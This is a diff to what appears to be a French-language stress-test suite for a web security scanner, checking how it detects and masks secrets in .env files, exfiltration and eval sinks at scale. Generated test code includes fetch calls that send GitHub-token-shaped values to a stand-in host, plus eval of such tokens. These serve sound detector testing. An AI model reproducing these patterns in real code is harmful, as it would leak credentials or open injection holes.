@@ -30,6 +30,14 @@ const RACINE_PAR_DEFAUT = path.resolve(path.dirname(ICI), '..');
 const MIO = 1 << 20;
 const TETE = '<!doctype html><html lang="fr"><title>t</title>';
 const N = (n, f) => Array.from({ length: n }, (_, i) => f(i)).join('');
+/** `n` caractères alphanumériques tirés d'une graine (la ligne `i`) : les mêmes à chaque lancement, différents d'une ligne à l'autre. */
+function hasard(n, i) {
+  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let x = (i * 2654435761 + 12345) >>> 0;
+  let s = '';
+  for (let k = 0; k < n; k++) { x = (Math.imul(x, 1664525) + 1013904223) >>> 0; s += alphabet[(x >>> 8) % alphabet.length]; }
+  return s;
+}
 const imbrique = (c, niveaux) => { for (let i = 0; i < niveaux; i++) c = `@import url("data:text/css,${encodeURIComponent(c)}");`; return c; };
 
 /** `pages` pages d'entrée qui chargent le même `app.js` : un import distant que la carte de chaque page couvre, et `modules` modules locaux (la surface de document de chaque page a `modules` arêtes). */
@@ -82,6 +90,15 @@ const CAS = [
   ['analyse : 200 000 fois « a. » dans un fichier que l\'analyse ne lit pas (400 Kio)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'a.'.repeat(200000) })],
   ['analyse : 14 000 fois « importScripts( » sans parenthèse fermante (200 Kio)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'importScripts('.repeat(14000) })],
   ['analyse : 28 000 fois « importScripts( » sans parenthèse fermante (400 Kio)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'importScripts('.repeat(28000) })],
+
+  // --- analyse complète : le jugement des valeurs de C-SECRET-01 (leurres, libellés, fichiers d'exemple) et le masque de chaque constat.
+  //     Les jetons sont assemblés à l'exécution : aucun secret n'est écrit dans ce fichier.
+  ['analyse : 3 000 valeurs de 4 096 caractères qui ont la forme d\'un libellé sans en être un (12 Mio)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'var x = 1;\n', '.env': N(3000, (i) => `PASSWORD_${i}=A${'b'.repeat(4094)}9\n`) })],
+  ['analyse : 3 000 libellés de 4 096 caractères (12 Mio, une majuscule puis des minuscules)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'var x = 1;\n', '.env': N(3000, (i) => `PASSWORD_${i}=Z${'a'.repeat(4095)}\n`) })],
+  ['analyse : 20 000 lignes de secret tiré au hasard dans un .env (un constat chacune, toutes masquées)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'var x = 1;\n', '.env': N(20000, (i) => `API_KEY_${i}=${hasard(32, i)}\n`) })],
+  ['analyse : 40 000 lignes de secret tiré au hasard dans un .env (un constat chacune, toutes masquées)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': 'var x = 1;\n', '.env': N(40000, (i) => `API_KEY_${i}=${hasard(32, i)}\n`) })],
+  ['analyse : 20 000 fetch d\'une adresse qui porte un jeton GitHub (un constat de C-EXFIL-01 chacun, masqué)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': N(20000, (i) => `fetch('https://api.example.com/x?t=gh${'p_'}${hasard(36, i)}');\n`) })],
+  ['analyse : 20 000 eval d\'un jeton GitHub (un constat de C-XSS-03 chacun, masqué)', 'analyse', () => ({ 'index.html': `${TETE}<script src="app.js"></script>`, 'app.js': N(20000, (i) => `eval("var t = 'gh${'p_'}${hasard(36, i)}'");\n`) })],
 
   // --- analyse complète : CSS (lecteur, conversion en constats, extraits, numéros de ligne)
   ['analyse : .css, 40 000 url() externes sur une ligne', 'analyse', () => ({ 'index.html': `${TETE}<link rel=stylesheet href=a.css>`, 'a.css': N(40000, (i) => `.a${i}{background:url(https://e.example/${i}.png)}`) })],
